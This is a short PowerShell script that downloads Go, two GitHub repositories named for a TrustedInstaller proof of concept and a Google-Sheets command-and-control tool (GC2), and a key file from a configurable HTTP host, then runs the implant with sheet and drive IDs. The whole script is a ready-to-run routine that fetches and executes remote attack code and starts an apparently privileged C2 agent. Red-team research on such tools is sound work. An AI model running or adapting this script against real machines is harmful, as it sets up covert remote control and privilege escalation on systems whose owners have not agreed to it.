# Define variables
$myUrl = ""
$myKey = ""
$mySheetId = ""
$myDriveId = ""

# Define download URLs
$goUrl = "https://go.dev/dl/go1.21.12.windows-amd64.zip"
$tiRepoUrl = "https://github.com/nathansb2022/TrustedInstallerPOC-GC2-Sheet/archive/refs/heads/master.zip"
$gc2RepoUrl = "https://github.com/nathansb2022/GC2-sheet-Scripted/archive/refs/heads/master.zip"
$keyFileUrl = "http://$myUrl/$myKey"

# Change to the Downloads directory
Set-Location "$env:userprofile\Downloads"

# Function to download and extract a ZIP file
function Download-And-Extract {
    param (
        [string]$url,
        [string]$outFile
    )

    Invoke-WebRequest -Uri $url -OutFile $outFile
    Expand-Archive $outFile
    Remove-Item -Path $outFile -Force
}

# Download and extract Go
Download-And-Extract -url $goUrl -outFile "go.zip"
Move-Item .\go "$env:userprofile"

# Add Go to the PATH if not already present
if (-not ($env:PATH -match [regex]::Escape("$env:userprofile\go\go\bin"))) {
    $env:PATH += ";$env:userprofile\go\go\bin"
}

# Download and extract repositories
Download-And-Extract -url $tiRepoUrl -outFile "timaster.zip"
Download-And-Extract -url $gc2RepoUrl -outFile "master.zip"

# Download the key file
Invoke-WebRequest -Uri $keyFileUrl -UseBasicParsing -OutFile ".\master\GC2-sheet-Scripted-master\$myKey"

# Change to the TrustedInstaller directory
Set-Location "$env:userprofile\Downloads\timaster\TrustedInstallerPOC-GC2-Sheet-master"

# Run the gc2-sheet executable with the specified parameters
go run ti $myKey $mySheetId $myDriveId
